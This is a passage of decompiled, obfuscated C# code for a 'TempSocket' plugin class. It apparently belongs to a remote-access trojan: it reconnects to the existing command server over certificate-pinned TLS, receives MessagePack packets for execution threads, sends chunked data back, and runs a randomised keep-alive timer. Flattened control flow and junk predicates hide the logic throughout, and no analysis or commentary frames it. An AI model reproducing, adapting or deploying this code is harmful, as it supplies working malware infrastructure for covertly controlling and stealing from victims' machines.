using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public class TempSocket
{
	[CompilerGenerated]
	private Socket _003CTcpClient_003Ek__BackingField;

	[CompilerGenerated]
	private SslStream _003CSslClient_003Ek__BackingField;

	[CompilerGenerated]
	private byte[] _003CBuffer_003Ek__BackingField;

	[CompilerGenerated]
	private bool _003CIsConnected_003Ek__BackingField;

	internal static TempSocket ghwUeAhWgHduNNMt6eY;

	public Socket TcpClient
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		get
		{
			return _003CTcpClient_003Ek__BackingField;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		set
		{
			int num = 1;
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 0:
					return;
				case 1:
					_003CTcpClient_003Ek__BackingField = value;
					num2 = 0;
					if (LYN2bYh0aMKXxaAmvbk() != null)
					{
						num2 = 0;
					}
					break;
				}
			}
		}
	}

	public SslStream SslClient
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		get
		{
			return _003CSslClient_003Ek__BackingField;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		set
		{
			int num = 1;
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 0:
					return;
				case 1:
					_003CSslClient_003Ek__BackingField = value;
					num2 = 0;
					if (!deNMoyhT2L0Hqf021Hd())
					{
						num2 = 0;
					}
					break;
				}
			}
		}
	}

	private byte[] Buffer
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		get
		{
			return _003CBuffer_003Ek__BackingField;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		set
		{
			int num = 1;
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 0:
					return;
				case 1:
					_003CBuffer_003Ek__BackingField = value;
					num2 = 0;
					if (!deNMoyhT2L0Hqf021Hd())
					{
						num2 = 0;
					}
					break;
				}
			}
		}
	}

	private static long HeaderSize
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static long Offset
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public bool IsConnected
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		get
		{
			return _003CIsConnected_003Ek__BackingField;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		set
		{
			int num = 1;
			while (true)
			{
				int num2 = num;
				do
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						break;
					case 0:
						return;
					}
					_003CIsConnected_003Ek__BackingField = value;
					num2 = 0;
				}
				while (LYN2bYh0aMKXxaAmvbk() == null);
			}
		}
	}

	private object SendSync
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
	}

	private static Timer Tick
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public TempSocket()
	{
		vXO7DShQ7QSLJ8k4kSU();
		SendSync = new object();
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		int num4 = default(int);
		while (true)
		{
			switch (num)
			{
			case 1:
				return;
			case 3:
				try
				{
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					zLCyuShN01SeVYhSKnc(socket, 51200, MK4qCH8UROXnUiRvhp.PMWGwASam);
					zLCyuShN01SeVYhSKnc(socket, 51200, MK4qCH8UROXnUiRvhp.jxCfKDPAQ);
					TcpClient = socket;
					int num3 = 3;
					while (true)
					{
						switch (num3)
						{
						case 1:
							return;
						case 3:
							JRwqULh1dKA3dcYrEv0(TcpClient, ((string[])W4i098hBf49eUXhpG3S(HfdPxhhehBdSV6QZeQK(jICUmm27lcbq5IDhMr.z47kjpyvh(R8Cbgih5WCKAWu0BlaF(), jICUmm27lcbq5IDhMr.DGoNeg9Ec), jCKTRhrgDRr1WrG3L3.vxTc8Auru), new char[1] { ':' }, VYlV3DipC0LqbVia0Z.Je7J7JcZp))[0], tMBhdthuwass1m7c7YA(((string[])W4i098hBf49eUXhpG3S(HfdPxhhehBdSV6QZeQK(tHyqikhGKTysLXpf4us(R8Cbgih5WCKAWu0BlaF(), jICUmm27lcbq5IDhMr.DGoNeg9Ec), jCKTRhrgDRr1WrG3L3.vxTc8Auru), new char[1] { ':' }, VYlV3DipC0LqbVia0Z.Je7J7JcZp))[1], pAWpamH5CcW1B020OJ.iqYZL1tCC), GWpmcxuHbG3r1hdYuQ.eW1mQibSa);
							num3 = 9;
							break;
						case 6:
							SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate);
							num3 = 4;
							break;
						case 8:
							WhCqrVhI1R2IqfwLxd4(SslClient, Buffer, 0, Buffer.Length, new AsyncCallback(ReadServertData), null, aJWqHaDo3Pw5ZTODTG.iSSMGiarr);
							num3 = 1;
							if (true)
							{
								break;
							}
							goto IL_008e;
						case 7:
							Offset = 0L;
							num3 = 0;
							if (true)
							{
								break;
							}
							goto IL_008e;
						case 5:
							Buffer = new byte[p9tNw1hLZldcnkhpxZH()];
							num3 = 7;
							break;
						default:
							Tick = new Timer(CheckServer, null, j7y7aChHHqlsT5aERiW(new Random(), 15000, 30000, S2egd241F9cPMYT8VE.FI5Amdcme), j7y7aChHHqlsT5aERiW(new Random(), 15000, 30000, S2egd241F9cPMYT8VE.FI5Amdcme));
							num3 = 8;
							if (0 == 0)
							{
								break;
							}
							goto IL_008e;
						case 4:
							JQHfXShs12aU3E1QcDu(SslClient, VYlV3DipC0LqbVia0Z.z47kjpyvh(jCKTRhrgDRr1WrG3L3.z47kjpyvh(tHyqikhGKTysLXpf4us(TcpClient, jICUmm27lcbq5IDhMr.DGoNeg9Ec), jCKTRhrgDRr1WrG3L3.vxTc8Auru), new char[1] { ':' }, VYlV3DipC0LqbVia0Z.Je7J7JcZp)[0], null, SslProtocols.Tls, false, OoTa4Qd8MRHPE2p6OH.N0j5rWq8k);
							num3 = 1;
							if (0 == 0)
							{
								num3 = 2;
							}
							break;
						case 9:
							IsConnected = true;
							num3 = 4;
							if (0 == 0)
							{
								num3 = 6;
							}
							break;
						case 2:
							{
								v8ZZrvhPALJw6NNJYrm(4L);
								num3 = 3;
								if (true)
								{
									num3 = 5;
								}
								break;
							}
							IL_008e:
							num3 = num4;
							break;
						}
					}
				}
				catch
				{
					int num5 = 2;
					while (true)
					{
						int num6 = num5;
						do
						{
							IL_02fd:
							switch (num6)
							{
							case 1:
								return;
							case 2:
								Dispose();
								num6 = 0;
								if (false)
								{
									num6 = 0;
								}
								goto IL_02fd;
							}
							IsConnected = false;
							num6 = 1;
						}
						while (true);
					}
				}
			default:
				num = (w2PHskhVQyRxCgIL3a2() ? 3 : 2);
				break;
			case 2:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return S4UXLMh8w2vh8rTdQva(Connection.ServerCertificate, certificate, w0f6vu9E8XTkPjuUQn.xfBCxZsgY);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Dispose()
	{
		int num = 2;
		int num2 = num;
		int num4 = default(int);
		int num9 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 3:
				return;
			case 1:
				try
				{
					IJoGUGLISAgJE5TaoN.z47kjpyvh(TcpClient, SocketShutdown.Both, IJoGUGLISAgJE5TaoN.lEGV56vUI);
					int num3 = 0;
					if (LYN2bYh0aMKXxaAmvbk() != null)
					{
						num3 = num4;
					}
					switch (num3)
					{
					case 0:
						break;
					}
				}
				catch
				{
					int num5 = 0;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						num5 = 0;
					}
					switch (num5)
					{
					case 0:
						break;
					}
				}
				goto case 4;
			case 4:
				num2 = 0;
				if (LYN2bYh0aMKXxaAmvbk() == null)
				{
					num2 = 0;
				}
				continue;
			case 2:
				IsConnected = false;
				num2 = 1;
				if (!deNMoyhT2L0Hqf021Hd())
				{
					num2 = 0;
				}
				continue;
			}
			try
			{
				object obj2 = xDTPtvh4Qg26WhfOpwZ();
				int num6;
				if (obj2 == null)
				{
					num6 = 5;
				}
				else
				{
					jQVrwihDDJy2EO5WXXg(obj2, mboOir10HR4srG2D2u.oNvwD3BR9);
					num6 = 4;
				}
				while (true)
				{
					int num7 = num6;
					while (true)
					{
						switch (num7)
						{
						case 1:
							return;
						case 2:
							return;
						default:
						{
							Socket tcpClient = TcpClient;
							if (tcpClient == null)
							{
								num7 = 1;
								if (LYN2bYh0aMKXxaAmvbk() == null)
								{
									continue;
								}
								break;
							}
							jQVrwihDDJy2EO5WXXg(tcpClient, mboOir10HR4srG2D2u.K3PtXF0bv);
							num7 = 2;
							continue;
						}
						case 4:
						case 5:
						{
							SslStream sslClient = SslClient;
							if (sslClient == null)
							{
								num7 = 3;
								if (LYN2bYh0aMKXxaAmvbk() != null)
								{
									num7 = 0;
								}
								continue;
							}
							jQVrwihDDJy2EO5WXXg(sslClient, mboOir10HR4srG2D2u.wybRRd8QI);
							num7 = 0;
							if (LYN2bYh0aMKXxaAmvbk() == null)
							{
								continue;
							}
							break;
						}
						}
						break;
					}
				}
			}
			catch
			{
				int num8 = 0;
				if (LYN2bYh0aMKXxaAmvbk() != null)
				{
					num8 = num9;
				}
				switch (num8)
				{
				case 0:
					break;
				}
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ReadServertData(IAsyncResult ar)
	{
		switch (1)
		{
		case 1:
			try
			{
				int num = default(int);
				if (wG3RlJh9X2ioOavmNG0(TcpClient, iSrcdAq4lDOxuHcg7y.G7LhvxQDv))
				{
					num = 22;
					goto IL_0048;
				}
				goto IL_0381;
				IL_0381:
				IsConnected = false;
				int num2 = 30;
				goto IL_004c;
				IL_0048:
				num2 = num;
				goto IL_004c;
				IL_004c:
				int num4 = default(int);
				int num3 = default(int);
				while (true)
				{
					switch (num2)
					{
					case 17:
					case 31:
					case 34:
					case 42:
						aJWqHaDo3Pw5ZTODTG.z47kjpyvh(SslClient, Buffer, (int)l67xhghjIm1w2hTbG0g(), (int)HeaderSize, ReadServertData, null, aJWqHaDo3Pw5ZTODTG.iSSMGiarr);
						num2 = 35;
						continue;
					case 9:
						v8ZZrvhPALJw6NNJYrm(p9tNw1hLZldcnkhpxZH() - num4);
						num2 = 39;
						if (!deNMoyhT2L0Hqf021Hd())
						{
							num2 = 2;
						}
						continue;
					case 19:
						if (p9tNw1hLZldcnkhpxZH() < 0)
						{
							num2 = 40;
							continue;
						}
						goto case 6;
					case 29:
						v8ZZrvhPALJw6NNJYrm(4L);
						num2 = 5;
						continue;
					case 7:
						J8tgpqhEwEHjjlZTRyf(0L);
						num2 = 2;
						continue;
					case 24:
						v8ZZrvhPALJw6NNJYrm(p9tNw1hLZldcnkhpxZH() - num3);
						num2 = 19;
						continue;
					case 12:
					case 21:
						break;
					case 37:
						Buffer = new byte[p9tNw1hLZldcnkhpxZH()];
						num2 = 31;
						continue;
					case 1:
						if (num3 > 0)
						{
							num2 = 21;
							continue;
						}
						goto IL_04bd;
					case 32:
						goto IL_0241;
					case 35:
						return;
					case 15:
						v8ZZrvhPALJw6NNJYrm(4L);
						num2 = 37;
						continue;
					case 16:
						if (num4 <= 0)
						{
							num2 = 33;
							continue;
						}
						goto IL_029f;
					case 28:
						goto IL_029f;
					case 14:
						IsConnected = false;
						num2 = 36;
						if (LYN2bYh0aMKXxaAmvbk() != null)
						{
							num2 = 11;
						}
						continue;
					case 11:
						return;
					case 8:
						return;
					case 22:
						goto IL_0309;
					case 20:
						goto IL_034b;
					case 18:
						goto end_IL_004c;
					case 40:
						goto IL_03b0;
					case 38:
					case 43:
						if (HeaderSize < 0)
						{
							goto case 14;
						}
						goto IL_03d8;
					case 2:
						Buffer = new byte[p9tNw1hLZldcnkhpxZH()];
						num2 = 10;
						continue;
					case 13:
						HeaderSize = rj7AamhbyKttu0s6onR(Buffer, 0, QPgmNYeAsDX5auW4KF.CwXjtIxYP);
						num2 = 0;
						if (LYN2bYh0aMKXxaAmvbk() == null)
						{
							num2 = 0;
						}
						continue;
					case 25:
						J8tgpqhEwEHjjlZTRyf(0L);
						num2 = 15;
						continue;
					case 5:
						Buffer = new byte[p9tNw1hLZldcnkhpxZH()];
						num2 = 32;
						if (!deNMoyhT2L0Hqf021Hd())
						{
							num2 = 30;
						}
						continue;
					case 6:
					case 10:
						if (HeaderSize <= 0)
						{
							num2 = 20;
							continue;
						}
						goto IL_0484;
					case 4:
						goto IL_0484;
					case 27:
						goto IL_04bd;
					case 23:
					case 26:
						goto IL_04d9;
					case 33:
					case 41:
						IsConnected = false;
						num2 = 3;
						continue;
					case 30:
						return;
					default:
						if (p9tNw1hLZldcnkhpxZH() > 0)
						{
							num2 = 7;
							if (!deNMoyhT2L0Hqf021Hd())
							{
								num2 = 4;
							}
							continue;
						}
						goto case 29;
					case 36:
						return;
					case 39:
						if (p9tNw1hLZldcnkhpxZH() != 0L)
						{
							num2 = 43;
							continue;
						}
						goto case 13;
					case 3:
						return;
					}
					J8tgpqhEwEHjjlZTRyf(Offset + num3);
					num2 = 24;
					if (deNMoyhT2L0Hqf021Hd())
					{
						continue;
					}
					goto IL_0048;
					IL_04d9:
					num4 = drmb11h36d9FYgVcwA5(SslClient, ar, rqp4Zv630Uosr50HoI.m9gXDX7xR);
					num2 = 16;
					if (deNMoyhT2L0Hqf021Hd())
					{
						continue;
					}
					goto IL_0048;
					IL_03d8:
					num = 34;
					goto IL_0048;
					IL_03b0:
					IsConnected = false;
					num2 = 8;
					if (deNMoyhT2L0Hqf021Hd())
					{
						continue;
					}
					goto IL_0048;
					IL_034b:
					juWrCNO4flrXJe0WlU.z47kjpyvh(new Thread(Packet.Read), Buffer, juWrCNO4flrXJe0WlU.tSHQqRBCK);
					num2 = 25;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						continue;
					}
					goto IL_0048;
					IL_0309:
					if (!IsConnected)
					{
						break;
					}
					num2 = 26;
					if (deNMoyhT2L0Hqf021Hd())
					{
						continue;
					}
					goto IL_0048;
					IL_0484:
					num3 = tpVGEQhpvtj4c4XgMLT(SslClient, Buffer, (int)Offset, (int)p9tNw1hLZldcnkhpxZH(), JY7oD1obtHTcYL0jkM.il5EfUa5b);
					num2 = 1;
					if (deNMoyhT2L0Hqf021Hd())
					{
						continue;
					}
					goto IL_0048;
					IL_029f:
					Offset = l67xhghjIm1w2hTbG0g() + num4;
					num = 9;
					goto IL_0048;
					IL_0241:
					J8tgpqhEwEHjjlZTRyf(0L);
					num2 = 42;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						continue;
					}
					goto IL_0048;
					IL_04bd:
					IsConnected = false;
					num2 = 11;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						continue;
					}
					goto IL_0048;
					continue;
					end_IL_004c:
					break;
				}
				goto IL_0381;
			}
			catch
			{
				int num5 = 1;
				if (!deNMoyhT2L0Hqf021Hd())
				{
					goto IL_05ae;
				}
				goto IL_05b2;
				IL_05ae:
				int num6 = default(int);
				num5 = num6;
				goto IL_05b2;
				IL_05b2:
				do
				{
					switch (num5)
					{
					default:
						return;
					case 1:
						break;
					case 0:
						return;
					}
					IsConnected = false;
					num5 = 0;
				}
				while (deNMoyhT2L0Hqf021Hd());
				goto IL_05ae;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Send(byte[] msg)
	{
		int num = 1;
		int num2 = num;
		object sendSync = default(object);
		bool flag = default(bool);
		int num4 = default(int);
		byte[] array = default(byte[]);
		int num6 = default(int);
		MemoryStream memoryStream = default(MemoryStream);
		int num9 = default(int);
		byte[] array2 = default(byte[]);
		int num11 = default(int);
		int num13 = default(int);
		int num15 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 2:
				try
				{
					LeTPmcPZqoLlcT4laU.z47kjpyvh(sendSync, ref flag, LeTPmcPZqoLlcT4laU.L5X3t4WqV);
					int num3 = 0;
					if (!deNMoyhT2L0Hqf021Hd())
					{
						num3 = num4;
					}
					switch (num3)
					{
					default:
						try
						{
							int num5;
							if (!IsConnected)
							{
								num5 = 0;
								if (!deNMoyhT2L0Hqf021Hd())
								{
									num5 = 0;
								}
								goto IL_008c;
							}
							goto IL_00ca;
							IL_033e:
							array = tZvpfMbwSoXbokDoFE.z47kjpyvh(msg.Length, tZvpfMbwSoXbokDoFE.DJJ7HJ6F4);
							num5 = 9;
							if (!deNMoyhT2L0Hqf021Hd())
							{
								goto IL_0088;
							}
							goto IL_008c;
							IL_0088:
							num5 = num6;
							goto IL_008c;
							IL_008c:
							while (true)
							{
								switch (num5)
								{
								case 8:
									break;
								case 6:
									goto IL_00de;
								case 9:
									IFf9IMhkR0LX494Gc3u(TcpClient, -1, SelectMode.SelectWrite, FrHkThYcyyXtSsIhlj.ye7TyCBio);
									num5 = 4;
									if (deNMoyhT2L0Hqf021Hd())
									{
										num5 = 6;
									}
									continue;
								default:
									Dispose();
									num5 = 12;
									continue;
								case 5:
									memoryStream = new MemoryStream(msg);
									num5 = 4;
									continue;
								case 1:
									U8nAjGs0T5rBoWoyHC.z47kjpyvh(SslClient, msg, 0, msg.Length, U8nAjGs0T5rBoWoyHC.fSH0cenTO);
									num5 = 3;
									continue;
								case 3:
									jQVrwihDDJy2EO5WXXg(SslClient, mboOir10HR4srG2D2u.Y1jvwveJk);
									num5 = 2;
									continue;
								case 4:
									try
									{
										int num7 = 0;
										int num8 = 5;
										if (!deNMoyhT2L0Hqf021Hd())
										{
											goto IL_01ba;
										}
										goto IL_01be;
										IL_01ba:
										num8 = num9;
										goto IL_01be;
										IL_01be:
										while (true)
										{
											switch (num8)
											{
											case 2:
												array2 = new byte[50000];
												num8 = 0;
												if (LYN2bYh0aMKXxaAmvbk() == null)
												{
													continue;
												}
												break;
											case 4:
												J3bKUEhFcbedUEffZv1(SslClient, array2, 0, num7, U8nAjGs0T5rBoWoyHC.fSH0cenTO);
												num8 = 3;
												continue;
											default:
												if ((num7 = JY7oD1obtHTcYL0jkM.z47kjpyvh(memoryStream, array2, 0, array2.Length, JY7oD1obtHTcYL0jkM.il5EfUa5b)) <= 0)
												{
													num8 = 6;
													if (deNMoyhT2L0Hqf021Hd())
													{
														continue;
													}
													break;
												}
												goto case 1;
											case 5:
												chgv5ug5FMDchWYwil.z47kjpyvh(memoryStream, 0L, chgv5ug5FMDchWYwil.eiOKIFPx0);
												num8 = 2;
												continue;
											case 1:
												IFf9IMhkR0LX494Gc3u(TcpClient, -1, SelectMode.SelectWrite, FrHkThYcyyXtSsIhlj.ye7TyCBio);
												num8 = 4;
												continue;
											case 6:
												return;
											}
											break;
										}
										goto IL_01ba;
									}
									finally
									{
										if (memoryStream != null)
										{
											int num10 = 0;
											if (LYN2bYh0aMKXxaAmvbk() != null)
											{
												num10 = num11;
											}
											while (true)
											{
												switch (num10)
												{
												default:
													jQVrwihDDJy2EO5WXXg(memoryStream, mboOir10HR4srG2D2u.oRMSmtUPg);
													num10 = 1;
													if (LYN2bYh0aMKXxaAmvbk() == null)
													{
														num10 = 1;
													}
													continue;
												case 1:
													break;
												}
												break;
											}
										}
									}
								case 11:
									if (msg.Length > 1000000)
									{
										num5 = 5;
										if (LYN2bYh0aMKXxaAmvbk() != null)
										{
											num5 = 0;
										}
										continue;
									}
									goto case 1;
								case 7:
									goto IL_033e;
								case 12:
									return;
								case 2:
									return;
								}
								break;
								IL_00de:
								J3bKUEhFcbedUEffZv1(SslClient, array, 0, array.Length, U8nAjGs0T5rBoWoyHC.fSH0cenTO);
								num5 = 11;
								if (deNMoyhT2L0Hqf021Hd())
								{
									continue;
								}
								goto IL_0088;
							}
							goto IL_00ca;
							IL_00ca:
							if (!w2PHskhVQyRxCgIL3a2())
							{
								num5 = 10;
								goto IL_008c;
							}
							goto IL_033e;
						}
						catch
						{
							int num12 = 0;
							if (deNMoyhT2L0Hqf021Hd())
							{
								num12 = 0;
							}
							while (true)
							{
								switch (num12)
								{
								default:
									IsConnected = false;
									num12 = 2;
									break;
								case 2:
									Dispose();
									num12 = 1;
									if (!deNMoyhT2L0Hqf021Hd())
									{
										num12 = num13;
									}
									break;
								case 1:
									return;
								}
							}
						}
					}
				}
				finally
				{
					int num14;
					if (flag)
					{
						num14 = 0;
						if (!deNMoyhT2L0Hqf021Hd())
						{
							goto IL_0408;
						}
						goto IL_040c;
					}
					goto end_IL_03ec;
					IL_040c:
					while (true)
					{
						switch (num14)
						{
						case 1:
							goto end_IL_040c;
						}
						JHMjAehw2JUwkMWFsxi(sendSync, saluL6n0LnUyW8Em13.YpIxT68X5);
						num14 = 1;
						if (deNMoyhT2L0Hqf021Hd())
						{
							continue;
						}
						goto IL_0408;
						continue;
						end_IL_040c:
						break;
					}
					goto end_IL_03ec;
					IL_0408:
					num14 = num15;
					goto IL_040c;
					end_IL_03ec:;
				}
			case 3:
				return;
			case 1:
				sendSync = SendSync;
				num2 = 0;
				if (deNMoyhT2L0Hqf021Hd())
				{
					num2 = 0;
				}
				break;
			default:
				flag = false;
				num2 = 2;
				if (!deNMoyhT2L0Hqf021Hd())
				{
					num2 = 1;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CheckServer(object obj)
	{
		int num = 4;
		MsgPack msgPack = default(MsgPack);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 2:
					g7NSf9hxfsDIBsvZ0VU(msgPack.ForcePathObject((string)S6SH8VhKqbgwwNHf7AQ(84)), "");
					num2 = 1;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						num2 = 1;
					}
					continue;
				case 0:
					return;
				case 4:
					msgPack = new MsgPack();
					num = 3;
					break;
				case 1:
					Send((byte[])x5hRNFhUsiMI14gteRg(msgPack));
					num2 = 0;
					if (LYN2bYh0aMKXxaAmvbk() == null)
					{
						continue;
					}
					break;
				case 3:
					g7NSf9hxfsDIBsvZ0VU(TQLFTwh2ggRECQaBYLI(msgPack, S6SH8VhKqbgwwNHf7AQ(0)), S6SH8VhKqbgwwNHf7AQ(72));
					num = 2;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool deNMoyhT2L0Hqf021Hd()
	{
		return ghwUeAhWgHduNNMt6eY == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static TempSocket LYN2bYh0aMKXxaAmvbk()
	{
		return ghwUeAhWgHduNNMt6eY;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void vXO7DShQ7QSLJ8k4kSU()
	{
		WkMgYHbfSUMGdoITRx.L1qNarFzphQww();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool w2PHskhVQyRxCgIL3a2()
	{
		return Connection.IsConnected;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void zLCyuShN01SeVYhSKnc(object P_0, int P_1, object P_2)
	{
		MK4qCH8UROXnUiRvhp.z47kjpyvh(P_0, P_1, (MK4qCH8UROXnUiRvhp)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object R8Cbgih5WCKAWu0BlaF()
	{
		return Connection.TcpClient;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object HfdPxhhehBdSV6QZeQK(object P_0, object P_1)
	{
		return jCKTRhrgDRr1WrG3L3.z47kjpyvh(P_0, (jCKTRhrgDRr1WrG3L3)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object W4i098hBf49eUXhpG3S(object P_0, object P_1, object P_2)
	{
		return VYlV3DipC0LqbVia0Z.z47kjpyvh(P_0, (char[])P_1, (VYlV3DipC0LqbVia0Z)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object tHyqikhGKTysLXpf4us(object P_0, object P_1)
	{
		return jICUmm27lcbq5IDhMr.z47kjpyvh(P_0, (jICUmm27lcbq5IDhMr)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int tMBhdthuwass1m7c7YA(object P_0, object P_1)
	{
		return pAWpamH5CcW1B020OJ.z47kjpyvh((string)P_0, (pAWpamH5CcW1B020OJ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JRwqULh1dKA3dcYrEv0(object P_0, object P_1, int P_2, object P_3)
	{
		GWpmcxuHbG3r1hdYuQ.z47kjpyvh(P_0, (string)P_1, P_2, (GWpmcxuHbG3r1hdYuQ)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JQHfXShs12aU3E1QcDu(object P_0, object P_1, object P_2, SslProtocols P_3, bool P_4, object P_5)
	{
		OoTa4Qd8MRHPE2p6OH.z47kjpyvh(P_0, (string)P_1, (X509CertificateCollection)P_2, P_3, P_4, (OoTa4Qd8MRHPE2p6OH)P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void v8ZZrvhPALJw6NNJYrm(long value)
	{
		HeaderSize = value;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long p9tNw1hLZldcnkhpxZH()
	{
		return HeaderSize;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int j7y7aChHHqlsT5aERiW(object P_0, int P_1, int P_2, object P_3)
	{
		return S2egd241F9cPMYT8VE.z47kjpyvh(P_0, P_1, P_2, (S2egd241F9cPMYT8VE)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object WhCqrVhI1R2IqfwLxd4(object P_0, object P_1, int P_2, int P_3, object P_4, object P_5, object P_6)
	{
		return aJWqHaDo3Pw5ZTODTG.z47kjpyvh(P_0, (byte[])P_1, P_2, P_3, (AsyncCallback)P_4, P_5, (aJWqHaDo3Pw5ZTODTG)P_6);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool S4UXLMh8w2vh8rTdQva(object P_0, object P_1, object P_2)
	{
		return w0f6vu9E8XTkPjuUQn.z47kjpyvh(P_0, (X509Certificate)P_1, (w0f6vu9E8XTkPjuUQn)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xDTPtvh4Qg26WhfOpwZ()
	{
		return Tick;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void jQVrwihDDJy2EO5WXXg(object P_0, object P_1)
	{
		mboOir10HR4srG2D2u.z47kjpyvh(P_0, (mboOir10HR4srG2D2u)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool wG3RlJh9X2ioOavmNG0(object P_0, object P_1)
	{
		return iSrcdAq4lDOxuHcg7y.z47kjpyvh(P_0, (iSrcdAq4lDOxuHcg7y)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int drmb11h36d9FYgVcwA5(object P_0, object P_1, object P_2)
	{
		return rqp4Zv630Uosr50HoI.z47kjpyvh(P_0, (IAsyncResult)P_1, (rqp4Zv630Uosr50HoI)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long l67xhghjIm1w2hTbG0g()
	{
		return Offset;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int rj7AamhbyKttu0s6onR(object P_0, int P_1, object P_2)
	{
		return QPgmNYeAsDX5auW4KF.z47kjpyvh((byte[])P_0, P_1, (QPgmNYeAsDX5auW4KF)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void J8tgpqhEwEHjjlZTRyf(long value)
	{
		Offset = value;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int tpVGEQhpvtj4c4XgMLT(object P_0, object P_1, int P_2, int P_3, object P_4)
	{
		return JY7oD1obtHTcYL0jkM.z47kjpyvh(P_0, (byte[])P_1, P_2, P_3, (JY7oD1obtHTcYL0jkM)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool IFf9IMhkR0LX494Gc3u(object P_0, int P_1, SelectMode P_2, object P_3)
	{
		return FrHkThYcyyXtSsIhlj.z47kjpyvh(P_0, P_1, P_2, (FrHkThYcyyXtSsIhlj)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void J3bKUEhFcbedUEffZv1(object P_0, object P_1, int P_2, int P_3, object P_4)
	{
		U8nAjGs0T5rBoWoyHC.z47kjpyvh(P_0, (byte[])P_1, P_2, P_3, (U8nAjGs0T5rBoWoyHC)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JHMjAehw2JUwkMWFsxi(object P_0, object P_1)
	{
		saluL6n0LnUyW8Em13.z47kjpyvh(P_0, (saluL6n0LnUyW8Em13)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object S6SH8VhKqbgwwNHf7AQ(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object TQLFTwh2ggRECQaBYLI(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

